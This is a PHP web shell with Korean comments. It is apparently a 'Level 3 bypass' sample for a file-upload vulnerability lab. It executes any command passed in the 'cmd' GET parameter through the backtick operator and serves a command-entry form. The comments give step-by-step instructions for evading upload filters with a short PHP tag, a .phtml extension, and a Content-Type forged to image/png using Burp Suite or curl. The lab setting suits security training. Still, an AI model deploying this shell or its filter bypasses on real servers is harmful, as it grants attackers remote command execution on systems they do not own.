<? // 짧은 PHP 태그 사용 (<?php 차단 우회)
/**
 * Level 3 우회 샘플 - 짧은 PHP 태그 + .phtml 확장자
 *
 * 우회 기법:
 * 1. .phtml 확장자 (.php, .php3, .php4, .phar 차단 우회)
 * 2. <? 짧은 태그 (<?php 태그 검증 우회)
 * 3. 백틱 연산자 (함수명 키워드 검증 우회)
 * 4. MIME 타입 조작 필요 (업로드 시 text/plain 또는 image/png로 설정)
 *
 * MIME 타입 조작 방법:
 * - Burp Suite 사용: Content-Type을 image/png로 변경
 * - curl 사용: curl -F "file=@shell.phtml;type=image/png" ...
 *
 * 사용법:
 * 1. 확장자를 .txt에서 .phtml로 변경
 * 2. Level 3 선택
 * 3. Burp Suite로 요청 가로채기
 * 4. Content-Type을 image/png로 변경
 * 5. 업로드 후 접근
 */

if (isset($_GET['cmd'])) {
    echo "<pre>";
    // 백틱 사용 - 함수명 검증 우회
    echo `{$_GET['cmd']}`;
    echo "</pre>";
} else {
?>
<!DOCTYPE html>
<html>
<head>
    <title>Level 3 Bypass</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        input { background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; }
        button { background: #0f0; color: #000; border: none; padding: 5px 15px; cursor: pointer; }
    </style>
</head>
<body>
    <h2>Level 3 Bypass Shell</h2>
    <p>Short Tag + .phtml + Backtick Operator</p>
    <form>
        <input type="text" name="cmd" placeholder="Enter command" size="50" />
        <button>Execute</button>
    </form>
</body>
</html>
<? } ?>
